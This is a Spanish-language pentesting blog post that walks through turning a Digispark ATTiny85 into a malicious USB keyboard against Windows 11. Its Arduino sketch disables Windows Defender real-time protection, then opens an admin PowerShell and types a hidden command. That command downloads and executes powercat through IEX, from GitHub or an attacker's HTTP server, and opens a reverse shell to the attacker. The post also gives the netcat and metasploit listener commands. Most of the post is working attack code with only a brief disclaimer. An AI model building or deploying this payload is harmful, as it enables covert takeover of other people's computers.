---
title: Reverse Shells con Arduino
date: 2023-01-09 19:38
categories: [Pentesting, Hardware, Arduino, Shell]
tags: [windows, shell, reverse-shell]
---

![Reverse Shell Post Banner](/assets/img/2023-01-09/reverse-shell.png)
En este post vamos a reprogramar un controlador Arduino para que se comporte como un dispositivo HID (vamos como un teclado) para que lance una serie de comandos que nos permitan acceder a la shell de un dispositivo Windows 11 en la misma red. 

> No me hago responsable de los daños que pueda causar el mal uso de este tutorial, la responsabilidad recaerá en quién haga uso de estas técnicas con finalidades no éticas.
{: .prompt-danger}

### El controlador
Para este tutorial usaremos un microcontrolador compatible con Arduino llamado **Digispark ATTiny85** se puede encontrar en tiendas como Aliexpress por 2€. 
![Foto del microcontrolador](/assets/img/2023-01-09/attiny85.jpeg)
Para que la placa funcione con el [Arduino IDE](https://www.arduino.cc/en/software) deberemos instalar los 'drivers' del microcontrolador. Para instalarlos deberás acceder a "Archivo">"Preferencias" y en "Gestor de URLs adicionales de tarjetas" añadiremos la siguiente URL: `http://digistump.com/package_digistump_index.json` ![Captura de pantalla](/assets/img/2023-01-09/preferencias.png) 
Después de haber añadido el URL pulsaremos en "Herramientas">"Placas">"Gestor de tarjetas". ![](/assets/img/2023-01-09/gestor_placas.png)

Y en el gestor de tarjetas buscaremos "Digistump AVR Boards" y pulsaremos instalar.

![](/assets/img/2023-01-09/instalacion.png)

Por ahora iba todo genial pero hay un problema, la librería "DigiKeyboard.h" que se encarga de convertir el microcontrolador en un teclado viene en distribución de teclado americano por lo que si intentamos de explotar un sistema con la distribución de teclado español tendremos problemas.

Realmente tiene facil solución gracias a [este repo de github](https://github.com/Dasor/digispark-keyboard-layout-Spanish)

Nos podemos bajar los ficheros "DigiKeyboard.h" y "scancode-ascii-table.h" usando `curl` o `wget`. En mi caso usaré curl.
```bash
curl -s -o DigiKeyboard.h https://raw.githubusercontent.com/Dasor/digispark-keyboard-layout-Spanish/master/DigiKeyboard.h
curl -s -o scancode-ascii-table.h https://raw.githubusercontent.com/Dasor/digispark-keyboard-layout-Spanish/master/scancode-ascii-table.h
```
> Si usas Windows debes de reemplazar `curl` por `curl.exe` ya que las versiones recientes de Windows incluyen esta herramienta de manera predeterminada.
{: .prompt-info }

Luego deberemos reemplazar los archivos que acabamos de descargar por los de la librería DigisparkKeyboard. Solo tendríamos que reemplazar los archivos en 
<br>
```
(Linux) $HOME/.arduino/packages/digistump/hardware/avr/(versión)/libraries/DigisparkKeyboard/
```
```
(Windows) C:\Users\(NombreDeUsuario)\AppData\Local\Arduino15\packages\digistump\hardware\avr\(version)\libraries\DigisparkKeyboard\
```

Con esto ya podemos explotar sistemas españoles(o usando una distribución de teclado española).

### Picando código
Al principio del archivo se importa la librería `DigiKeyboard.h` y se definen distintas teclas que usaremos más tarde (Esc, Tab, Space).
```cpp
#include "DigiKeyboard.h"

#define KEY_ESC     41 
#define KEY_TAB     43
#define KEY_SPACE   44
```

Inicializamos el LED para que nos informe al terminar el ataque y lo dejamos apagado.
```cpp
void setup() {
  pinMode(1, OUTPUT);
  digitalWrite(1, LOW);
}
```
 
Para poder crear una reverse shell deberemos de desactivar Windows Defender, de esto se encarga la función `disarm_defender()`.

```cpp
void disarm_defender() {
  // abre el buscador de windows
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(700);

  // abre la configuración de seguridad
  DigiKeyboard.print(F("seguridad"));
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // deshabilita la protección a tiempo real
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // cierra la ventana
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  }
```

Con esto ya Windows nos permitiría correr el siguiente snippet de código en powershell. 
```powershell
PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://(IP)/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}
```
Vamos a analizarlo:
```powershell
PowerShell.exe -WindowStyle hidden{}
```

Ejecuta las instrucciones dentro de las llaves y esconde la terminal de PowerShell de manera que no la detecte el usuario.

```powershell
powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://(IP)/powercat.ps1');"
```
Como posteriormente veremos, para realizar este ataque tendremos que crear un servidor HTTP en caso de que el objetivo no tenga conexión a Internet para que se descargue powercat (Lo usaremos para crear la reverse shell porque es fácil de manejar y porque normalmente las máquinas Windows no tienen Netcat instalado). Si sabes que el objetivo tiene conexión a Internet, a lo mejor te es más conviniente introducir el URL del archivo powercat.ps1 `https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1`. En resumen, este snippet sirve para bajarse el fichero powercat.ps1 ya sea de un servidor que hostea el atacante o del propio repositorio de Github.

```powershell
powercat -c (IP) -p (PUERTO) -e powershell\
```
Este snippet sirve para conectarnos al atacante lanzando un intérprete de powershell (Deberemos de poner la IP del atacante y el puerto que está en escucha en la máquina atacante). Esto hace que el atacante tome control del sistema ya que como ahora veremos vamos a conseguir lanzar este snippet como administrador.

Con el siguiente código abriríamos powershell y ejecutaríamos el comando con perisos de administrador.

```cpp
void create_reverse_shell (){
    //abre powershell con permisos de administrador
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print(F("powershell"));
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT|MOD_SHIFT_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1500);
    // RECORDATORIO: Puedes cambiar el URL al archivo de powercat si el objetivo tiene conexión a internet. (Así nos ahorramos tener el servidor HTTP)
    DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}");
    // esconde la ventana al usuario y nos permite tomar el control completo del sistema
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
```

Lo que resta para terminar el programa es añadir el método `loop()`. Este método se encargará de lanzar las funciones definidas anteriormente y cuando termine apagará y encenderá el LED del microcontrolador.

```cpp
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  
  disarm_defender();
  create_reverse_shell();
  
  while (true){
      digitalWrite(1, HIGH);
      delay(300);
      digitalWrite(1, LOW);
      delay(300);
  }
}
``` 

Os dejo el código en [mi perfil de Github](https://github.com/404a10/reverse-shell-arduino).

Flasheamos el código al microcontrolador y preparamos el lado del atacante.

### Si sabemos que el objetivo no tiene conexión a Internet
Nos descargaremos el archivo de powercat a un directorio y desde ahí montaremos un servidor HTTP en el que serviremos el archivo para que la víctima pueda descargarlo para posteriormente ejecutarlo. Necesitaríamos tener instalado `python3`.
Navegas al directorio en el que esté el archivo y servirlo usando 
```bash
python3 -m  http.server 80
```
**Recordatorio:**<br>
Para que esto funcione deberás de cambiar la parte del programa que se encarga de ejecutar el snippet en powershell para que descargue powercat desde el servidor HTTP.
Cambiamos de esto:
```powershell
DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}");
```
A esto:
```powershell
DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://(IP)/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}");
```

### Esperar a la conexión
Como ya sabrás, el atacante debe esperar la conexión del cliente, para esperar la conexión que generará la máquina víctima al conectarse el microcontrolador.

Podemos esperar la conexión del atacante usando herramientas como `netcat` y `metasploit`. Para esperar a conexiones entrantes en `netcat` podríamos hacerlo de esta manera:
```bash
nc -lvp (PUERTO)
```
El parámetro -l sirve para esperar a conexiones entrantes, -v es para activar la verbosa y poder ver más información en la pantalla mientras que -p sirve para especificar el puerto en el que estamos escuchando.

Usando metasploit podríamos hacerlo de la siguiente manera:
```bash
msfconsole
use exploit/multi/handler
set LHOST (IP de la interfaz del atacante conectada a la red de la victima)
set LPORT (PUERTO en el que queremos recibir conexiones)
run
```

Esto sería todo, muchas gracias por leer, 
<br>
`Happy Hacking!`

<br><br>
_Si encuentras algún error o errata házmelo saber._
